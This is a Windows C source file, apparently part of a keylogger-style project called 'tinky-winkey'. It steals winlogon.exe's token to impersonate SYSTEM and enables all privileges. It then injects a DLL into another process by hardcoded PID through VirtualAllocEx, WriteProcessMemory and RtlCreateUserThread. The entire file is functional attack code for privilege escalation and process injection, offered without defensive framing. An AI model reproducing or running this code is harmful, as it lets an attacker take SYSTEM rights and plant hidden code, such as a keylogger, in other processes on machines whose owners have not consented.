#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <bcrypt.h>
#include <winternl.h>



typedef long (*_RtlCreateUserThread)(HANDLE,
    PSECURITY_DESCRIPTOR,
    BOOLEAN,ULONG,
    PULONG,PULONG,
    PVOID,PVOID,
    PHANDLE,CLIENT_ID* );

_RtlCreateUserThread RtlCreateUserThread;

void PrintUserNameByProc(void)
{
    TOKEN_USER tokenUser;
    DWORD dwSize = 0;
    HANDLE hToken;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken failed.\n");
        1;
        return;
    }
    GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &dwSize);
    PTOKEN_USER pTokenUser = malloc(dwSize);
    if (pTokenUser == NULL)
    {
        printf("malloc failed");
        exit(1);
    }
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
    {
        // Obtenir le SID de l'utilisateur
        SID_NAME_USE sidType;
        char name[256];
        char domain[256];
        DWORD nameSize = sizeof(name);
        DWORD domainSize = sizeof(domain);
        
        if (LookupAccountSid(NULL, pTokenUser->User.Sid, name, &nameSize, domain, &domainSize, &sidType))
            printf("User: %s\\%s\n", domain, name);
        else
        {
            printf("LookupAccountSid failed.\n");
            1;
        }
    }
    else
        1;
    free(pTokenUser);
}

/**
 * Imprime le nom de l'utilisateur courant du thread.
 */
void PrintUserNameByThread(void)
{
    TOKEN_USER tokenUser;
    DWORD dwSize = 0;
    HANDLE hToken;

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE,&hToken)) {
        printf("OpenThreadToken failed.\n");
        1;
        return;
    }
    GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &dwSize);
    PTOKEN_USER pTokenUser = malloc(dwSize);
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
    {
        // Obtenir le SID de l'utilisateur
        SID_NAME_USE sidType;
        char name[256];
        char domain[256];
        DWORD nameSize = sizeof(name);
        DWORD domainSize = sizeof(domain);
        
        if (LookupAccountSid(NULL, pTokenUser->User.Sid, name, &nameSize, domain, &domainSize, &sidType))
            printf("User: %s\\%s\n", domain, name);
        else
        {
            printf("LookupAccountSid failed.\n");
            1;
        }
    }
    else
        1;
    free(pTokenUser);
}

/**
 * Imprime les privileges sur la sortie standard.
 */
void PrintPrivileges(HANDLE hToken)
{
    DWORD returnLength;
    TOKEN_PRIVILEGES tp;

    GetTokenInformation(hToken, TokenPrivileges, &tp, sizeof(TOKEN_PRIVILEGES), &returnLength);
    PTOKEN_PRIVILEGES pPrivileges = malloc((size_t)returnLength);
    if (pPrivileges == NULL) {
        printf("malloc failed.\n");
        exit(1);
    }
    GetTokenInformation(hToken, TokenPrivileges, pPrivileges, returnLength, &returnLength);
    for (DWORD i = 0; i < pPrivileges->PrivilegeCount; i++)
    {
        LUID_AND_ATTRIBUTES la = pPrivileges->Privileges[i];
        char name[256];
        DWORD nameLen = sizeof(name);
        if (LookupPrivilegeNameA(NULL, &la.Luid, name, &nameLen)) {
            printf("%s %s", name, ((la.Attributes & SE_PRIVILEGE_ENABLED) ? "(ENABLED)\n" : "(DISABLED)\n"));
        }
    }
    free(pPrivileges);
    pPrivileges = NULL;
}

/**
 * Trouve l'identifiant de processus en fonction du nom de ce dernier.
 */
DWORD GetPIDByProcName(void)
{
    HANDLE handleProc = NULL;
    PROCESSENTRY32 pe32;

    handleProc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (handleProc == INVALID_HANDLE_VALUE)
        exit(1);
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(handleProc, &pe32))
    {
        CloseHandle(handleProc);
        exit(1);
    }
    if (!strcmp(pe32.szExeFile, "winlogon.exe"))
    {
        printf("Found winlogon.exe with PID %lu\n", pe32.th32ProcessID);
        CloseHandle(handleProc);
        return  pe32.th32ProcessID;
    }
    while (Process32Next(handleProc, &pe32))
    {
        if (!strcmp(pe32.szExeFile, "winlogon.exe"))
        {
            printf("Found winlogon.exe with PID %lu\n", pe32.th32ProcessID);
            CloseHandle(handleProc);
            return pe32.th32ProcessID;
        }
    }
    CloseHandle(handleProc);
    printf("Impossible to find winlogon.exe's PID. WHAT THE FU ??\n");
    exit(ERROR);
}

/**
 * Configure les privileges pour qu'ils soient tous actives s'il ne l'etaient pas avant.
 */
BOOL EnableAllPrivilege(HANDLE currentToken)
{
    TOKEN_PRIVILEGES tp;
    DWORD returnLength;

    GetTokenInformation(currentToken, TokenPrivileges, &tp, sizeof(TOKEN_PRIVILEGES), &returnLength);
    PTOKEN_PRIVILEGES pPrivileges = malloc((size_t)returnLength);
    if (pPrivileges == NULL) {
        printf("malloc failed.\n");
        exit(1);
    }
    GetTokenInformation(currentToken, TokenPrivileges, pPrivileges, returnLength, &returnLength);
    for (DWORD i = 0; i < pPrivileges->PrivilegeCount; i++)
        pPrivileges->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(currentToken, FALSE, pPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges failed.\n");
        exit(1);
    }
    return TRUE;
}

void ImpersonateSystemToken(void)
{
    HANDLE sysToken = NULL;
    HANDLE procHandle = NULL;
    HANDLE newSysTok = NULL;
    HANDLE currentToken = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentToken))
    {
        printf("OpenProcessToken failed.\n");
        exit(1);
    }
    EnableAllPrivilege(currentToken);
    // no token attached to the current thread, so we use the proc instead.
    PrintUserNameByProc();
    printf("\n=== Privileges before impersonation ===\n\n");
    PrintPrivileges(GetCurrentProcessToken());
    procHandle = OpenProcess(MAXIMUM_ALLOWED, TRUE, GetPIDByProcName());
    if (procHandle == NULL)
    {
        printf("Impossible to get the process handle.\n");
        exit(1);
    }
    BOOL success = OpenProcessToken(procHandle, TOKEN_DUPLICATE | TOKEN_QUERY, &sysToken);
    if (!success)
    {
        printf("Could not open the process token.\n");
        exit(1);
    }
    success = DuplicateTokenEx(sysToken, TOKEN_ALL_ACCESS_P, NULL, SecurityImpersonation,  TokenImpersonation, &newSysTok);
    if (!success)
    {
        printf("Could not duplicate the process token.\n");
        exit(1);
    }
    success = SetThreadToken((PHANDLE)NULL, newSysTok);
    if (!success)
    {
        printf("Failed to set the current thread's token.\n");
        exit(1);
    }
    PrintUserNameByThread();
    printf("\n=== Privileges for the thread after impersonation ===\n\n");
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, TRUE, &currentToken))
    {
        printf("OpenThreadToken failed.\n");
        exit(1);
    }
    EnableAllPrivilege(currentToken);
    PrintPrivileges(GetCurrentThreadToken()); 
}

int main(void)
{
    ImpersonateSystemToken();
HANDLE procHdl = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 2340);
    if (procHdl == NULL)
    {
        printf("Failed\n");
        exit(1);
    }
    LPCSTR dllPath = "E:\\tinky-winkey\\dll.dll";
    printf("Thread began ?\n");
    LPVOID baseAddr = VirtualAllocEx(procHdl, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (baseAddr == NULL)
    {
        exit(1);
    }
    WriteProcessMemory(procHdl, baseAddr, dllPath, strlen(dllPath) + 1, NULL);
    HMODULE ntdll=LoadLibrary("ntdll.dll");

    RtlCreateUserThread=(_RtlCreateUserThread)GetProcAddress(ntdll,"RtlCreateUserThread");
    LPVOID loadLib = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hThread;

    NTSTATUS status = RtlCreateUserThread(
        procHdl,
        NULL,
        FALSE,
        0,
        0,
        0,
        loadLib,
        baseAddr,
        &hThread,
        NULL
    );
    if (!NT_SUCCESS(status)) {
    char buf[128];
    printf("RtlCreateUserThread failed: 0x%08X\n", status);
}
    WaitForSingleObject(hThread, INFINITE);
    printf("Thread terminated ?\n");
    exit(0);
}
